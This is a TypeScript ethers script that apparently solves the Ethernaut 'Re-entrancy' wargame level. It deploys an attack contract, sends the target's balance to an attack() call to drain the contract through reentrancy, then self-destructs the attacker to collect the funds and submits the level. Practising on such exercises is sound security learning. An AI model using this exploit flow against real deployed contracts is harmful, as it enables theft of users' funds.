// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer } from "ethers";
import { getSigner } from "./signer";
import { ReentranceAttack10__factory } from "../typechain";
import { createLevel, submitLevel } from "./utils";


async function main() {
  const signer = getSigner();
  const level = await createLevel(signer, "Re-entrancy");
  console.log("deploy attack contract");
  const ct = await (new ReentranceAttack10__factory(signer)).deploy(level);
  await ct.deployed();

  const balance = await signer.provider?.getBalance(level) || BigNumber.from(0);
  console.log(`target balance: ${balance.toString()}`);


  console.log("attack contract");
  await (await ct.attack({ gasLimit: 900000, value: balance })).wait();
  console.log("destroy contract to withdraw balances")
  await ct.kill();


  console.log(`target balance: ${(await signer.provider?.getBalance(level) || "").toString()}`);
  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_to",
        "type": "address"
      }
    ],
    "name": "donate",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function",
    "payable": true,
    "signature": "0x00362a95"
  }
]